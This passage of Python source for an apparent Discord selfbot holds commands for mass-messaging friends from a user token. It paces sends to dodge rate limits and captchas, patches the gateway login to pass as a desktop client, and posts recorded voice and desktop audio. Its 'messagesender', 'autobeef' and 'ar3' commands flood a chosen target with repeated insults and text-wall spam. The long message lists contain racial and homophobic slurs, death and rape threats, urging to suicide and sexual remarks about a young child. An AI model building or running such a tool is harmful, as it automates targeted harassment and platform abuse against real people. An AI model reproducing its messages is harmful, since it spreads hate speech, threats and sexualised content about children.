            return False, "FAILED"
        except Exception as e:
            return False, f"ERROR: {str(e)}"

    status_msg = await ctx.send("```ansi\nInitializing Mass DM Operation...```")
    
    async with aiohttp.ClientSession() as session:
        async with session.get(
            "https://discord.com/api/v9/users/@me/relationships",
            headers={"authorization": bot.http.token}
        ) as response:
            if response.status != 200:
                await status_msg.edit(content="```ansi\nFailed to fetch friends list```")
                return
                
            friends = await response.json()
            friends = [f for f in friends if f.get("type") == 1]
            
            if not friends:
                await status_msg.edit(content="```ansi\nNo friends found```")
                return
                
            friends = friends[:num_friends]
            

            stats = {
                "success": 0,
                "blocked": 0,
                "ratelimited": 0,
                "captcha": 0,
                "failed": 0
            }
            
            start_time = time.time()
            
            for index, friend in enumerate(friends, 1):
                friend_id = friend['user']['id']
                friend_username = f"{friend['user']['username']}#{friend['user']['discriminator']}"
                
                success, status = await send_message_to_friend(friend_id, friend_username)
                
                if success:
                    stats["success"] += 1
                elif status == "BLOCKED":
                    stats["blocked"] += 1
                elif status == "RATELIMIT":
                    stats["ratelimited"] += 1
                elif status == "CAPTCHA":
                    stats["captcha"] += 1
                else:
                    stats["failed"] += 1
                
                elapsed_time = time.time() - start_time
                progress = (index / len(friends)) * 100
                msgs_per_min = (index / elapsed_time) * 60 if elapsed_time > 0 else 0
                eta = (elapsed_time / index) * (len(friends) - index) if index > 0 else 0
                
                bar_length = 20
                filled = int(progress / 100 * bar_length)
                bar = "█" * filled + "░" * (bar_length - filled)
                

                status = f"""```ansi
Mass DM Progress
{red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Progress: {green}[{bar}] {progress:.1f}%
Successful: {blue}{stats['success']} Blocked: {blue}{stats['blocked']} Rate Limited: {blue}{stats['ratelimited']}
Captcha: {blue}{stats['captcha']} Failed: {blue}{stats['failed']}

Messages/min: {red}{msgs_per_min:.1f}
Elapsed Time: {red}{int(elapsed_time)}s
ETA: {red}{int(eta)}s

Current: {blue}{friend_username}
Status: {blue}{status}```"""
                
                await status_msg.edit(content=status)
                
                if index % 5 == 0:
                    delay = random.uniform(30.0, 60.0)
                    await asyncio.sleep(delay)
                else:
                    await asyncio.sleep(random.uniform(8.0, 12.0))
            final_time = time.time() - start_time
            final_status = f"""```ansi
Mass DM Complete
{red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Successful: {blue}{stats['success']}
Blocked: {blue}{stats['blocked']}
Rate Limited: {blue}{stats['ratelimited']}
Captcha: {blue}{stats['captcha']}
Failed: {blue}{stats['failed']}

Total Time: {red}{int(final_time)}s
Avg Speed: {red}{(stats['success'] / final_time * 60):.1f} msgs/min```"""
            
            await status_msg.edit(content=final_status)
        


  
    
    
from discord.gateway import DiscordWebSocket

async def identify(self):
    payload = {
        'op': self.IDENTIFY,
        'd': {
            'token': self.token,
            'properties': {
                '$os': 'Windows',
                '$browser': 'Discord Client',
                '$device': 'Desktop',
                '$referrer': '',
                '$referring_domain': ''
            },
            'compress': True,
            'large_threshold': 250,
            'v': 3
        }
    }

    if self.shard_id is not None and self.shard_count is not None:
        payload['d']['shard'] = [self.shard_id, self.shard_count]

    state = self._connection
    if state._activity is not None or state._status is not None:
        payload['d']['presence'] = {
            'status': state._status,
            'game': state._activity,
            'since': 0,
            'afk': False
        }

    if state._intents is not None:
        payload['d']['intents'] = state._intents.value

    await self.call_hooks('before_identify', self.shard_id, initial=self._initial_identify)
    await self.send_as_json(payload)
    
DiscordWebSocket.identify = identify


from discord.ext import commands, tasks


   

MESSAGES = [
    "yo {name} shut the fuck up",
    "fuck up {name}",
    "hey {name} shut the fuck up speaking",
    "nigga named {name} fuck up talking lol",
    "yo bitch {name} didn't I say shut up",
    "I am getting tired of you talking {name} so shut the fuck up",
    "shut up {name}",
    "{name} bitch shut that shit up",
    "{name} can you shut the fuck up",
    "nigga {name} shut the fuck up right now",
    "{name} shut your lips bitch",
    "{name} cry and shut the fuck up",
]

# Dictionary to store active tasks
tasks_dict = {}


@bot.command()
@require_password()
async def messagesender(ctx, channel_id: int, user_id: int, minutes: int, *, name: str):
    
    if (channel_id, user_id) in tasks_dict:
        await ctx.send("A task is already running for this channel and user.")
        return

    async def task():
        """Task to send periodic messages."""
        channel = bot.get_channel(channel_id)
        if channel is None:
            await ctx.send(f"Channel with ID {channel_id} not found.")
            return
        
        counter = 0
        while True:
            message_content = random.choice(MESSAGES).format(name=name)
            if counter % 2 == 0:
                message = f"{message_content} <@{user_id}>"
            else:
                message = message_content
            
            await channel.send(message)
            counter += 1
            await asyncio.sleep(minutes * 60)

    # Start the task
    task_instance = bot.loop.create_task(task())
    tasks_dict[(channel_id, user_id)] = task_instance
    await ctx.send(f"Started sending messages to <@{user_id}> in <#{channel_id}> every {minutes} minutes.")


autoreplies2 = [
    "A\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nA\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nA\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nA\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n{endmessage}"
]


vm_duration = 5

@bot.command()
@require_password()
async def vmtime(ctx, seconds: int = None):
    global vm_duration
    
    if seconds is None:
        await ctx.send(f"```Current recording duration: {vm_duration} seconds\nUsage: $vmtime <seconds>```")
        return
        
    if not 5 <= seconds <= 15:
        await ctx.send("```Duration must be between 5 and 15 seconds```")
        return
        
    vm_duration = seconds
    await ctx.send(f"```Voice recording duration set to {seconds} seconds```")


@bot.command()
@require_password()
async def voicemessage(ctx):
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        recordings_dir = os.path.join(current_dir, 'screenshots')
        recordings = glob.glob(os.path.join(recordings_dir, 'voice_*.mp3'))
        
        if not recordings:
            await ctx.send("```No voice recordings found```")
            return
            
        latest_recording = max(recordings, key=os.path.getctime)
        
        file_size = os.path.getsize(latest_recording) / (1024 * 1024)
        has_nitro = bool(ctx.author.guild_permissions.administrator)
        
        if has_nitro:
            size_limit = 500
        else:
            size_limit = 25
            
        if file_size > size_limit:
            await ctx.send(f"```Recording is too large to send ({file_size:.2f}MB > {size_limit}MB limit)```")
            return
            
        await ctx.send(file=discord.File(latest_recording))
        await ctx.message.delete()
        
    except Exception as e:
        await ctx.send(f"```Error sending voice recording: {str(e)}```")


audio_duration = 15

@bot.command()
@require_password()
async def audiotime(ctx, time_str: str = None):
    global audio_duration
    
    if time_str is None:
        await ctx.send(f"```Current recording duration: {audio_duration} seconds\nUsage: $audiotime <time>\nExample: 30s or 1m```")
        return
        
    try:
        if time_str.endswith('s'):
            seconds = int(time_str[:-1])
        elif time_str.endswith('m'):
            seconds = int(time_str[:-1]) * 60
        else:
            await ctx.send("```Invalid format. Use 's' for seconds or 'm' for minutes (e.g., 30s or 1m)```")
            return
            
        if not 10 <= seconds <= 60:
            await ctx.send("```Duration must be between 10 seconds and 1 minute```")
            return
            
        audio_duration = seconds
        await ctx.send(f"```Desktop audio recording duration set to {seconds} seconds```")
        
    except ValueError:
        await ctx.send("```Invalid time format```")


@bot.command()
@require_password()
async def audiopaste(ctx):
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        recordings_dir = os.path.join(current_dir, 'screenshots')
        recordings = glob.glob(os.path.join(recordings_dir, 'desktop_audio_*.mp3'))
        
        if not recordings:
            await ctx.send("```No desktop audio recordings found```")
            return
            
        latest_recording = max(recordings, key=os.path.getctime)
        
        file_size = os.path.getsize(latest_recording) / (1024 * 1024)
        has_nitro = bool(ctx.author.guild_permissions.administrator)
        
        if has_nitro:
            size_limit = 500
        else:
            size_limit = 25
            
        if file_size > size_limit:
            await ctx.send(f"```Recording is too large to send ({file_size:.2f}MB > {size_limit}MB limit)```")
            return
            
        await ctx.send(file=discord.File(latest_recording))
        await ctx.message.delete()
        
    except Exception as e:
        await ctx.send(f"```Error sending desktop audio: {str(e)}```")

@bot.command()
@require_password()
async def ar3(ctx, user: discord.User = None, *, message: str = None):
    if not user or not message:
        await ctx.send("```Usage: $ar2 <@user> <message>```")
        return
        
    reply_template = autoreplies2[0].replace("{endmessage}", message)
    
    def check(m):
        return m.author == user

    await ctx.send(f"```Started auto replying to {user.name} with custom message```")
    
    async def reply_loop():
        while True:
            try:
                message = await bot.wait_for('message', check=check)
                await message.reply(reply_template)
            except Exception as e:
                print(f"Error in ar2: {e}")
                continue
    
    task = bot.loop.create_task(reply_loop())
    autoreply_tasks[user.id] = task

@bot.command()
@require_password()
async def ar3end(ctx):
    if autoreply_tasks:
        for user_id, task in autoreply_tasks.items():
            task.cancel()
        autoreply_tasks.clear()
        await ctx.send("```Auto replies stopped```")
    else:
        await ctx.send("```No active auto replies```")

@bot.command()
async def messagesenderoff(ctx, channel_id: int, user_id: int):
    
    task_key = (channel_id, user_id)
    if task_key in tasks_dict:
        tasks_dict[task_key].cancel()
        del tasks_dict[task_key]
        await ctx.send(f"Stopped sending messages to <@{user_id}> in <#{channel_id}>.")
    else:
        await ctx.send("No active task found for the specified channel and user.")

import random
import asyncio
import discord
import time

autobeef_targets = {}  # Tracks active auto-beef targets
message_timestamps = {}  # Tracks the last few message times for spam detection
autobeefer_messages = [
    "ur shit as fuck pedophile {name}",
    "She is only 5 get that dick outta her nipples u pedo named {name}",
    "Yo fuck ass nigga named {name}, ur fuckin ass and u should hang urself with a dildo",
    "Stop tryna hit me u fuckin diddy {name}",
    "Fuck ass boy stop drinking horse semen",
    "nigga ur fuckin ass u shemale pedophile {name}",
    "{name} how about u kys now fucking twink",
    "Nigga ur fuckin ass {name}",
    "YO SHUT THE FUCK UP {name} LOL.",
    "thats why ur dad left u fuckin loser named {name}",
    "yo slut stop cutting ur self u fuckin retard",
    "bitch ass boy named {name} u killed ur self",
    "and this bitch ass nigga killed himself",
    "yo\nbitch\nshut\nthe\nfuck\nup\npedo\nass{name}",
    "stop sucking my dick u peon",
    "ur fuckin ass lol kys now pedo",
    "ur shit as fuck pedophile {name}",
    "She is only 5 get that dick outta her nipples u pedo named {name}",
    "Yo fuck ass nigga named {name}, ur fuckin ass and u should hang urself with a dildo",
    "Stop tryna hit me u fuckin diddy {name}",
    "Fuck ass boy stop drinking horse semen",
    "nigga ur fuckin ass u shemale pedophile {name}",
    "{name} how about u kys now fucking twink",
    "Nigga ur fuckin ass {name}",
    "YO SHUT THE FUCK UP {name} LOL.",
    "thats why ur dad left u fuckin loser named {name}",
    "yo slut stop cutting ur self u fuckin retard",
    "bitch ass boy named {name} u killed ur self",
    "and this bitch ass nigga killed himself",
    "yo\nbitch\nshut\nthe\nfuck\nup\npedo\nass{name}",
    "ur shit as fuck pedophile {name}",
  "She is only 5 get that dick outta her nipples u pedo named {name}!",
  "Yo fuck ass nigga named {name}, ur fuckin ass and u should hang urself with a dildo",
  "Stop tryna hit me u fuckin diddy {name}",
  "Fuck ass boy stop drinking horse semen",
  "nigga ur fuckin ass u shemale pedophile {name}",
  "{name} how about u kys now fucking twink",
  "Nigga ur fuckin ass {name}",
  "YO SHUT THE FUCK UP {name} LOL.",
 "thats why ur dad left u fuckin loser named {name}",
 "yo slut stop cutting ur self u fuckin retard {name} ",
"bitch ass boy named {name} u killed ur self {name} ",
"and this bitch ass nigga killed himself {name} ",
"yo\nbitch\nshut\nthe\nfuck\nup\npedo\nass{name}" "cringe pedophile {name} ","ugly faggot ass pedo","drop dead maggot","niggas spit on u everywhere u go","do u still cut yourself","isnt this the dork i made eat his on feces on cam LOL","ill cave yo teeth in","dork","soft ass queer","slit your throat pedophile","weak test tube baby","they watching me rip yo teeth out with pliers","sloppy mouth faggot","im ur diety","die faggot","ur weak bitch","ill rip your tongue out","ill erdacite whats left of your species","saggy breast loser","ill send u to god faggot","I WILL FUCKING MURDER YOU WITH MY BARE HANDS JEW","rape victim","insecure cunt","deformed man boobs LOL","pathetic leech make a name for yourself","I WILL STOMP YOUR HEAD IN FRAIL FAGGOT","YO BITCH I SAID SHUT THE FUCK UP WEAK TESTICA EATING FAGGOT ILL FUCKING END YOUR BLOODLINE","freak","ew your a pedo","cringe","yo remember when u used to eat your own feces on camera","u have no friends","illnfuckingnpunchnyournfacenoff","i invoke fear into your heart","saggy breast pedo","obese loser on discord with manboobs","dork with orge ears""dirty ass rodent molester" "u cant beef me","weakling","YO\nBITCH\nSHUT\nTHE\nFUCK\nUP\nWEAK\nASS\nPEDOPHILE\nCRINGE\nCHILDTOUCHER","ill crush every bone in your body slut","frail bitch","ill lynch u nigger","trash\nass\npedophile\nlame\ndork","YO BITCH SPEAK BACK IAN TELL U TO STOP","retard","dweeb","sloppy mouth faggot","your a nobody faggot","weak shitter","nigga cant up funds LOLOLOL lame pooron","ill break your teeth n make u cough blood up for weeks","ill snap your neck faggot","cuck","shit face","kys faggot""nb cares faggot", "YOU SUCK",
"dirty ass rodent molester {name} ",
"weak prostitute {name} ",
"stfu dork ass nigga {name} ",
"garbage ass slut {name} ",
"ur weak",
"why am i so above u rn",
"soft ass nigga",
"frail slut",
"ur slow as fuck",
"you cant beat me",
"shut the fuck up LOL",
"you suck faggot ass nigga be quiet",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck faggot ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck weak ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck soft ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck hoe ass nigga", "y ur ass so weak nigga", "yo stfu nb fw u", "com reject", "yo retard stfu", "pedo", "frail fuck",
"weakling", "# stop bothering minors", "# Don't Fold", "cuck", "faggot", "hop off the alt loser" "ðŸ¤¡","sup feces sniffer how u been", "hey i heard u like kids", "femboy", 
"sup retard", "ur actually ass wdf", "heard u eat ur boogers", "zoophile", "doesn't ur mom abuse u", "autistic fuck", "stop fantasizing about ur mom weirdo", "hey slut shut the fuck up","you're hideous bitch shut up and clean my dogs feces","hey slut come lick my armpits","prostitute stfu slut","bitch shut up","you are ass nigga you wanna be me so bad","why do your armpits smell like that","stop eating horse semen you faggot","stop sending me your butthole in DMs gay boy","why are you drinking tap water out of that goats anus","say something back bitch","you have a green shit ring around your bootyhole","i heard you use snake skin dildos","ill cum in your mouth booty shake ass nigga","type in chat stop fingering your booty hole","i heard you worship cat feces","worthless ass slave","get your head out of that toilet you slut","is it true you eat your dads belly button lint? pedo","fuck up baby fucker","dont you jerk off to elephant penis","hey i heard you eat your own hemorroids","shes only 5 get your dick off of her nipples pedo","you drink porta potty water","hey bitch\nstfu\nyou dogshit ass nigga\nill rip your face apart\nugly ass fucking pedo\nwhy does your dick smell like that\ngay ass faggot loser\nfucking freak\nshut up","i\nwill\nrip\nyour\nhead\noff\nof\nyour\nshoulders\npussy\nass\nslime ball","nigga\nshut\nup\npedophile","stfu you dogshit ass nigga you suck\nyour belly button smells like frog anus you dirty ass nigga\nill rape your whole family with a strap on\npathetic ass fucking toad","YOU\nARE\nWEAK\nAS\nFUCK\nPUSSY\nILL\nRIP\nYOUR\nVEINS\nOUT\nOF\nYOUR\nARMS\nFAGGOT\nASS\nPUSSY\nNIGGA\nYOU\nFRAIL\nASS\nLITTLE\nFEMBOY","tranny anus licking buffalo","your elbows stink","frog","ugly ass ostrich","pencil necked racoon","why do your elbows smell like squid testicals","you have micro penis","you have aids","semen sucking blood worm","greasy elbow geek","why do your testicals smell like dead   buffalo appendages","cockroach","Mosquito","bald penguin","cow fucker","cross eyed billy goat","eggplant","sweat gobbler","cuck","penis warlord","slave","my nipples are more worthy than you","hairless dog","alligator","shave your nipples","termite","bald eagle","hippo","cross eyed chicken","spinosaurus rex","deformed cactus","prostitute","come clean my suit","rusty nail","stop eating water balloons","dumb blow dart","shit ball","slime ball","golf ball nose","take that stick of dynamite out of your nose","go clean my coffee mug","hey slave my pitbull just took a shit, go clean his asshole","walking windshield wiper","hornet","homeless pincone","hey hand sanitizer come lick the dirt off my hands","ice cream scooper","aborted fetus","dead child","stop watching child porn and fight back","homeless rodant","hammerhead shark","hey sledgehammer nose","your breath stinks","you cross eyed street lamp","hey pizza face","shave your mullet","shrink ray penis","hey shoe box come hold my balenciagas","rusty cork screw","pig penis","hey cow sniffer","walking whoopee cushion","stop chewing on your shoe laces","pet bullet ant","hey mop come clean my floor","*rapes your ass* now what nigga","hey tissue box i just nutted on your girlfriend come clean it up","watermelon seed","hey tree stump","hey get that fly swatter out of your penis hole","melted crayon","hey piss elbows","piss ball","hey q tip come clean my ears","why is that saxaphone in your anus","stink beetle","bed bug","cross eyed bottle of mustard","hey ash tray","hey stop licking that stop sign","why is that spatula in your anus","hey melted chocolate bar","dumb coconut"
     
]

@bot.command()
@require_password()
async def autobeef(ctx, user_id: int, name: str, typing_time: float = 2.0):

    if user_id in autobeef_targets:
        await ctx.send(f"User with ID {user_id} is already being auto-beefed!")
        return

    message_timestamps[user_id] = []  # Initialize message timestamps for spam detection

    shuffled_messages = autobeefer_messages.copy()
    random.shuffle(shuffled_messages)

    async def send_autobeef(message):
        """
        Send up to 5 random auto-beef messages, avoiding repeats.
        """
        nonlocal shuffled_messages
        try:
            for _ in range(5):
                if not shuffled_messages:
                    shuffled_messages = autobeefer_messages.copy()
                    random.shuffle(shuffled_messages)

                random_message = shuffled_messages.pop(0).replace("{name}", name)
                if random.random() < 0.5:
                    random_message += f" <@{user_id}>"  # Mention the user using their ID
                
                # Show typing indicator in the same channel as the message
                async with message.channel.typing():
                    await asyncio.sleep(typing_time)
                await message.channel.send(random_message)
                await asyncio.sleep(random.uniform(0.5, 1.5))  # Delay between messages
        except Exception as e:
            print(f"Error in send_autobeef: {e}")

    async def beef_loop():
        """
        Main loop for monitoring user messages and sending auto-beef replies.
        """
        def check(m):
            return m.author.id == user_id

        while user_id in autobeef_targets:
            try:
                message = await bot.wait_for('message', check=check)

                now = time.time()
                message_timestamps[user_id].append(now)
                message_timestamps[user_id] = [t for t in message_timestamps[user_id] if now - t <= 5]
                
                if len(message_timestamps[user_id]) > 5:
                    print(f"Skipping auto-beef for user with ID {user_id} due to spam.")
                    await asyncio.sleep(1)
                    continue

                await send_autobeef(message)
            except Exception as e:
                print(f"Error in autobeef loop: {e}")
                await asyncio.sleep(1)

    autobeef_targets[user_id] = bot.loop.create_task(beef_loop())
    await ctx.send(f"Started auto-beefing user with ID {user_id} with messages mentioning '{name}'.")

@bot.command()
@require_password()
async def autobeefend(ctx, user_id: int):

    if user_id in autobeef_targets:
        autobeef_targets[user_id].cancel()
        del autobeef_targets[user_id]
        message_timestamps.pop(user_id, None)  # Clean up timestamps
        await ctx.send(f"Stopped auto-beefing user with ID {user_id}.")
    else:
        await ctx.send(f"No active auto-beefing task for user with ID {user_id}.")

aggressive_autobeefer_tasks = {}  # Tracks active aggressive autobeefer tasks
aggressive_autobeefer_delays = {}  # Tracks delays for each user/channel combination


aggressive_autobeefer_messages = [
    "ur shit as fuck pedophile {name}",
    "She is only 5 get that dick outta her nipples u pedo named {name}",
    "Yo fuck ass nigga named {name}, ur fuckin ass and u should hang urself with a dildo",
    "Stop tryna hit me u fuckin diddy {name}",
    "Fuck ass boy stop drinking horse semen",
    "nigga ur fuckin ass u shemale pedophile {name}",
    "{name} how about u kys now fucking twink",
    "Nigga ur fuckin ass {name}",
    "YO SHUT THE FUCK UP {name} LOL.",
    "thats why ur dad left u fuckin loser named {name}",
    "yo slut stop cutting ur self u fuckin retard",
    "bitch ass boy named {name} u killed ur self",
    "and this bitch ass nigga killed himself",
    "yo\nbitch\nshut\nthe\nfuck\nup\npedo\nass{name}",
    "ur shit as fuck pedophile {name}",
  "She is only 5 get that dick outta her nipples u pedo named {name}!",
  "Yo fuck ass nigga named {name}, ur fuckin ass and u should hang urself with a dildo",
  "Stop tryna hit me u fuckin diddy {name}",
  "Fuck ass boy stop drinking horse semen",
  "nigga ur fuckin ass u shemale pedophile {name}",
  "{name} how about u kys now fucking twink",
  "Nigga ur fuckin ass {name}",
  "YO SHUT THE FUCK UP {name} LOL.",
 "thats why ur dad left u fuckin loser named {name}",
 "yo slut stop cutting ur self u fuckin retard {name} ",
"bitch ass boy named {name} u killed ur self {name} ",
"and this bitch ass nigga killed himself {name} ",
"yo\nbitch\nshut\nthe\nfuck\nup\npedo\nass{name}" "cringe pedophile {name} ","ugly faggot ass pedo","drop dead maggot","niggas spit on u everywhere u go","do u still cut yourself","isnt this the dork i made eat his on feces on cam LOL","ill cave yo teeth in","dork","soft ass queer","slit your throat pedophile","weak test tube baby","they watching me rip yo teeth out with pliers","sloppy mouth faggot","im ur diety","die faggot","ur weak bitch","ill rip your tongue out","ill erdacite whats left of your species","saggy breast loser","ill send u to god faggot","I WILL FUCKING MURDER YOU WITH MY BARE HANDS JEW","rape victim","insecure cunt","deformed man boobs LOL","pathetic leech make a name for yourself","I WILL STOMP YOUR HEAD IN FRAIL FAGGOT","YO BITCH I SAID SHUT THE FUCK UP WEAK TESTICA EATING FAGGOT ILL FUCKING END YOUR BLOODLINE","freak","ew your a pedo","cringe","yo remember when u used to eat your own feces on camera","u have no friends","illnfuckingnpunchnyournfacenoff","i invoke fear into your heart","saggy breast pedo","obese loser on discord with manboobs","dork with orge ears""dirty ass rodent molester" "u cant beef me","weakling","YO\nBITCH\nSHUT\nTHE\nFUCK\nUP\nWEAK\nASS\nPEDOPHILE\nCRINGE\nCHILDTOUCHER","ill crush every bone in your body slut","frail bitch","ill lynch u nigger","trash\nass\npedophile\nlame\ndork","YO BITCH SPEAK BACK IAN TELL U TO STOP","retard","dweeb","sloppy mouth faggot","your a nobody faggot","weak shitter","nigga cant up funds LOLOLOL lame pooron","ill break your teeth n make u cough blood up for weeks","ill snap your neck faggot","cuck","shit face","kys faggot""nb cares faggot", "YOU SUCK",
"dirty ass rodent molester {name} ",
"weak prostitute {name} ",
"stfu dork ass nigga {name} ",
"garbage ass slut {name} ",
"ur weak",
"why am i so above u rn",
"soft ass nigga",
"frail slut",
"ur slow as fuck",
"you cant beat me",
"shut the fuck up LOL",
"you suck faggot ass nigga be quiet",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck faggot ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck weak ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck soft ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck hoe ass nigga", "y ur ass so weak nigga", "yo stfu nb fw u", "com reject", "yo retard stfu", "pedo", "frail fuck",
"weakling", "# stop bothering minors", "# Don't Fold", "cuck", "faggot", "hop off the alt loser" "ðŸ¤¡","sup feces sniffer how u been", "hey i heard u like kids", "femboy", 
"sup retard", "ur actually ass wdf", "heard u eat ur boogers", "zoophile", "doesn't ur mom abuse u", "autistic fuck", "stop fantasizing about ur mom weirdo", "hey slut shut the fuck up","you're hideous bitch shut up and clean my dogs feces","hey slut come lick my armpits","prostitute stfu slut","bitch shut up","you are ass nigga you wanna be me so bad","why do your armpits smell like that","stop eating horse semen you faggot","stop sending me your butthole in DMs gay boy","why are you drinking tap water out of that goats anus","say something back bitch","you have a green shit ring around your bootyhole","i heard you use snake skin dildos","ill cum in your mouth booty shake ass nigga","type in chat stop fingering your booty hole","i heard you worship cat feces","worthless ass slave","get your head out of that toilet you slut","is it true you eat your dads belly button lint? pedo","fuck up baby fucker","dont you jerk off to elephant penis","hey i heard you eat your own hemorroids","shes only 5 get your dick off of her nipples pedo","you drink porta potty water","hey bitch\nstfu\nyou dogshit ass nigga\nill rip your face apart\nugly ass fucking pedo\nwhy does your dick smell like that\ngay ass faggot loser\nfucking freak\nshut up","i\nwill\nrip\nyour\nhead\noff\nof\nyour\nshoulders\npussy\nass\nslime ball","nigga\nshut\nup\npedophile","stfu you dogshit ass nigga you suck\nyour belly button smells like frog anus you dirty ass nigga\nill rape your whole family with a strap on\npathetic ass fucking toad","YOU\nARE\nWEAK\nAS\nFUCK\nPUSSY\nILL\nRIP\nYOUR\nVEINS\nOUT\nOF\nYOUR\nARMS\nFAGGOT\nASS\nPUSSY\nNIGGA\nYOU\nFRAIL\nASS\nLITTLE\nFEMBOY","tranny anus licking buffalo","your elbows stink","frog","ugly ass ostrich","pencil necked racoon","why do your elbows smell like squid testicals","you have micro penis","you have aids","semen sucking blood worm","greasy elbow geek","why do your testicals smell like dead   buffalo appendages","cockroach","Mosquito","bald penguin","cow fucker","cross eyed billy goat","eggplant","sweat gobbler","cuck","penis warlord","slave","my nipples are more worthy than you","hairless dog","alligator","shave your nipples","termite","bald eagle","hippo","cross eyed chicken","spinosaurus rex","deformed cactus","prostitute","come clean my suit","rusty nail","stop eating water balloons","dumb blow dart","shit ball","slime ball","golf ball nose","take that stick of dynamite out of your nose","go clean my coffee mug","hey slave my pitbull just took a shit, go clean his asshole","walking windshield wiper","hornet","homeless pincone","hey hand sanitizer come lick the dirt off my hands","ice cream scooper","aborted fetus","dead child","stop watching child porn and fight back","homeless rodant","hammerhead shark","hey sledgehammer nose","your breath stinks","you cross eyed street lamp","hey 